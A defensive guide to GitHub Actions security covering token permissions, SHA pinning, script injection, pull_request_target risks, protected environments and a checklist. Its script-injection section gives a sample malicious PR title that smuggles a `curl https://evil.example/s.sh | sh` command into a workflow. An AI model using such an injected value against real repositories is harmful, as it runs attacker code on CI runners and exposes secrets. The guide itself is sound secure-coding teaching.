# Actions Security

A workflow runs code with access to your repository and secrets. Most Actions incidents come from a handful of mistakes.

## 1. Least-privilege `GITHUB_TOKEN`
```yaml
permissions:
  contents: read          # at the top of every workflow
```
Grant more per job only where needed (`pull-requests: write`, `pages: write`, `id-token: write`). Make read-only the repository default (*Settings → Actions → General → Workflow permissions*). A deploy job that only uses SSH needs `permissions: {}`.

## 2. Pin third-party actions to a commit SHA
Tags can be moved. If an action's repository is compromised, `@v4` can suddenly point to malicious code (this happened to a popular action in 2025, leaking secrets from thousands of repositories).
```yaml
- uses: some-org/some-action@8f4b7f84864484a7bf31766abe9204da3cbe65b3   # v2.3.1
```
GitHub's own `actions/*` are lower risk; still, Dependabot can keep SHA pins up to date (`package-ecosystem: github-actions`), so pinning costs nothing. Organizations can require SHA pinning and restrict which actions are allowed.

## 3. Never interpolate untrusted input into scripts
Anything from the event payload that a stranger controls (PR titles and bodies, branch names, issue comments, commit messages) is **attacker input**.
```yaml
# WRONG: ${{ }} is pasted into the script before bash runs it
- run: echo "Checking ${{ github.event.pull_request.title }}"

# RIGHT: pass it as data
- run: echo "Checking $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```
A title like `x"; curl https://evil.example/s.sh | sh; echo "` would otherwise run.

## 4. Be very careful with `pull_request_target` and `workflow_run`
- `pull_request` from a fork runs with a **read-only** token and **no secrets**: safe by design.
- `pull_request_target` runs in the context of the **base** repository **with secrets and a write token**. It's meant for labelling or commenting. If it checks out and runs the PR's code (`npm install` runs scripts!), a malicious PR gets your secrets.

Rule: with `pull_request_target`, never check out or execute the PR's code.

## 5. Protect deploy credentials with environments
Put production secrets in an **environment** restricted to `main`, optionally with required reviewers. A workflow edited on a feature branch then can't reach them. → [[github/Secrets and Environments]]

## 6. Self-hosted runners and public repositories
Anyone can open a PR on a public repository. With a self-hosted runner, that PR's code runs on **your** machine. Use self-hosted runners only for private repositories (or ephemeral, isolated runners).

## 7. Artifacts and logs are visible
Everyone with read access (everyone, for public repositories) can download artifacts and read logs. Don't upload `.env` files, and don't print secrets (masking only catches exact matches).

## 8. Review workflow changes like production code
Add `/.github/ @your-org/platform` to CODEOWNERS so changes to workflows need a second pair of eyes ([[github/Code Review]]).

## Tools
- **actionlint**: catches many script-injection patterns and invalid syntax.
- **zizmor**: a security linter for workflows (unpinned actions, dangerous triggers, template injection).
- **CodeQL** has an `actions` language to scan workflows ([[github/Security]]).
- **OpenSSF Scorecard** rates a repository's supply-chain practices.

## Checklist
- [ ] `permissions:` set, read-only by default
- [ ] third-party actions pinned to SHAs, Dependabot updates them
- [ ] no `${{ github.event.* }}` inside `run:`
- [ ] no `pull_request_target` that runs PR code
- [ ] production secrets only in a protected environment
- [ ] no self-hosted runners on public repositories
- [ ] CODEOWNERS on `.github/`
